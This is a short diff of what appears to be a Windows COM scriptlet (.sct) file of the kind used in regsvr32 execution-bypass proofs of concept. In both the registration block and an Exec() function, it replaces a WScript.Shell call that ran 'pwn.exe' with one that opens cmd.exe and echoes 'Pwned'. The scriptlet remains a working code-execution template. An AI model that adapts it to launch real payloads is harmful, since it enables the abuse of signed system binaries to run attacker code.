@@ -9,7 +9,7 @@
 	>
 	<script language="JScript">
 		<![CDATA[
-			var r = new ActiveXObject("WScript.Shell").Run("pwn.exe");
+			var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k echo Pwned");
 		]]>
 	</script>
 </registration>
@@ -22,7 +22,7 @@
 
 	function Exec()
 	{
-		var r = new ActiveXObject("WScript.Shell").Run("pwn.exe");
+		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k echo Pwned");
 	}
 
 ]]>
